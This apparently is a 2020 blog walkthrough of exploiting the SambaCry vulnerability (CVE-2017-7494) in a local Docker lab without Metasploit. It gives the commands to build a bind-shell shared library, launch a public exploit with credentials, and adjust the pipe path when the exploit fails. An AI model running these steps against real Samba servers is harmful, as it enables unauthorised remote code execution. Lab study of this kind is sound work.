---
layout: post
title:  "EternalRed aka Sambacry without Metasploit"
date:   2020-05-31 18:05:55 +0300
image:  EternalBlue/title.png
author-name: strik1r
tags:   [EternalRed, Without Metasploit, Exploit modification, Sambacry]
---

<h2>Prologue:</h2>
In this blog post we are going to explore using exploits without Metasploit at all. After EternalBlue, our next exploit will be EternalRed aka Sambacry.

<h3> Environment Setup </h3>
The easiest way to find an environment to test on, is to set up the docker machine with the instruction from the exploit page:[exploit](https://github.com/opsxcq/exploit-CVE-2017-7494)
But first we need to install docker. I will just show you all the commands I used to make it work on my KALI environment. The last line with hello world is just to test that everything worked:
```
curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add -
echo 'deb [arch=amd64] https://download.docker.com/linux/debian buster stable' | sudo tee /etc/apt/sources.list.d/docker.list
sudo apt-get update
sudo apt-get remove docker docker-engine docker.io
sudo apt-get install docker-ce
sudo docker run hello-world
```

Then downloading and starting the vulnerable machine. I added some more open ports:

```
docker run --rm -it \
       -p 137-139:137-139 \
       -p 445:445 -p 6699:6699 \
	   -p 4444:4444 -p 5555:5555 \
       vulnerables/cve-2017-7494
```
If you get the message : Cannot connect to the Docker daemon... try to start docker first.

```
service docker start
```

In case you would like to conect to the docker machine you need to do two things. First determinate the container ID then connect to the container.

```
docker ps
docker exec -ti id bash
```

![connectToContainer](/img/EternalRed/connectToContainer.png)

<h2>Detection</h2>

So we want to detect if the taget is vulnerable to Sambacry. We will use Nmap for this.

```
nmap --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -p445 127.0.0.1
```

![detection](/img/EternalRed/detect.png)

Oh we are vulnerable. I set the target ip to 127.0.0.1 because the docker command we used to start the box binds the port 445 to our local port 445. So we actually targeted the vulnerable box, not our attacker machine.

<h2>The Exploit</h2>

First let's grab the exploit and install everything needed.

```
git clone https://github.com/opsxcq/exploit-CVE-2017-7494
cd exploit-CVE-2017-7494
pip install -r requirements.txt
```

Now we have all setup. But before running it, Let's check the code. Starting with exploit.py we should go down until the __main__ function. Here is where are code execution starts. 

```
    ap = ArgumentParser(description="Sambacry (CVE-2017-7494) exploit by opsxcq")
    ap.add_argument("-t", "--target", required=True, help="Target's hostname")
    ap.add_argument("-e", "--executable", required=True, help="Executable/Payload file to use")
    ap.add_argument("-s", "--remoteshare", required=True, help="Executable/Payload shared folder to use")
    ap.add_argument("-r", "--remotepath", required=True, help="Executable/Payload path on remote file system")
    ap.add_argument("-u", "--user", required=False, help="Samba username (optional")
    ap.add_argument("-p", "--password", required=False, help="Samba password (optional)")
	ap.add_argument("-P", "--remoteshellport", required=False, help="Connect to a shell running in the remote host after exploitation")
```

This block is the parameters block. We can see what is needed to run the exploit. We have a remote shell port option too. This is in case we want the code to automatically connect to the bind shell which runs on the target.
Under that we can see a port already set up to 445. We can change it but SMB will probably be on port 445 so let's leave it for now. Now let's go to the function named exploit. 
First we open the smb connection to the target. Then we try to upload the file given in the parameter. Then we execute the exploit.

<h2>Exploit execution<h2>
This is the actual exploitation part. So far only the exploit code has been uploaded. If everything goes right, this few line will execute the uploaded code. The main idea is, that Samba can load libraries from shared locations. 
This information will be handy because we know now that only special files can be uploaded and executed. Now, for the execution to work, we need the full path of the uploaded payload. This is the point where in case the payload does not seem to execute,
you need to make adjustments. The actual malformed request should not be changed just the parameters. First let's not update the code here, but give ourself a better view on what's actually happening by writhing the actual malformed request to console.
Modified code:

```
    triggerModule = r'ncacn_np:%s[\pipe\%s]' % (target, remotepath)
	print("The exploit code section looks like this:")
	print(triggerModule)
    rpcTransport = transport.DCERPCTransportFactory(triggerModule)
    dce = rpcTransport.get_dce_rpc()
    triggerThread = Thread(target=dceTrigger, args=(dce,))
    triggerThread.daemon = True
    triggerThread.start()
```

After this we only have the handler. In case our payload is a bind shell, this handler will conect to it. We can delete this if we want to connect with a different methode. 
There is also a test if the exploit was successfull or not. Uname -a will run when the handler extabilish connection.

<h2>Payload<h2>
Let's check the payload givven for this exploit. This is a bind shell written in C. Looking at the code of bindshell-samba.c we can see a nicely commented code. Without going into much details, the only thing we need to take a look is where the port is set.

```
    hostAddr.sin_family = AF_INET;
    hostAddr.sin_port = htons(6699);
    hostAddr.sin_addr.s_addr = htonl(INADDR_ANY);
```

We can see that the listening port is set to 6699. We can change it anytime. 
Let's comply the payload

```
gcc -c -fpic bindshell-samba.c
gcc -shared -o libbindshell-samba.so bindshell-samba.o

```

<h2>All set <h2>
With that tiny little modification, the exploit is ready to run. By using the given command we can exploit the docker environment.

```
./exploit.py -t localhost -e libbindshell-samba.so \
             -s data -r /data/libbindshell-samba.so \
             -u sambacry -p nosambanocry -P 6699

```
![firstRun](/img/EternalRed/firstRun.png)

Here we can see that the exploit executed, the uname -a run, and we got back a command prompt. The exploit trigger that we wrote on the screen is: ncacn_np:localhost[\pipe\/data/libbindshell-samba.so] . Luckily we do not need modification here because the exploit creator made sure that this variable is easely controllable by the user.
We can set the -r parameter for the full path of the payload and it should work... for this version. After investigating the metasploit version [is_known_pipename](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/samba/is_known_pipename.rb), I found that it wil try not just the full path, but full path with added "\\\\PIPE\\". 
It looks like a few version needs this string before the path to work. In case the exploit did not worked, it is possible that "\\\\PIPE\\/sharename/file.so" could work as parameter -r.

